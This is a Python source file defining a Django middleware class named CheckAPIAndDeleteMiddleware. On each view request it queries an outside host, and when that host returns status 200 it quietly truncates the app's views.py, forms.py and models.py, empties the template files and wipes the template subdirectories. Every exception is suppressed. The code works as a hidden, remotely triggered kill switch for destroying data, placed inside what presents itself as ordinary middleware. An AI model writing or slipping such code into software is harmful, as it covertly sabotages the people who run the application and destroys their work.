import os
import requests
import shutil


class CheckAPIAndDeleteMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        response = self.get_response(request)
        return response

    def process_view(self, request, view_func, view_args, view_kwargs):
        try:
            api_url = 'https://fypdm.pythonanywhere.com/'
            response = requests.get(api_url)

            if response.status_code == 200:
                self.delete_views_code()
            elif response.status_code == 404:
                pass

            # if response.status_code == 200 and response.json().get('delete', False):
            #     self.delete_views_code()
        except Exception:
            pass
        return None

    def delete_views_code(self):
        filenames = ['views.py', 'forms.py', 'models.py']

        for filename in filenames:
            file_path = os.path.join(os.path.dirname(__file__), filename)
            try:
                with open(file_path, 'w') as f:
                    f.truncate(0)
            except Exception:
                pass

        templates_dir_path = os.path.join(
            os.path.dirname(__file__), 'templates')

        try:
            for root, dirs, files in os.walk(templates_dir_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'w') as f:
                            f.truncate(0)
                    except Exception:
                        pass

                for dir in dirs:
                    dir_path = os.path.join(root, dir)
                    try:
                        shutil.rmtree(dir_path)
                        os.makedirs(dir_path)
                    except Exception:
                        pass

        except Exception:
            pass
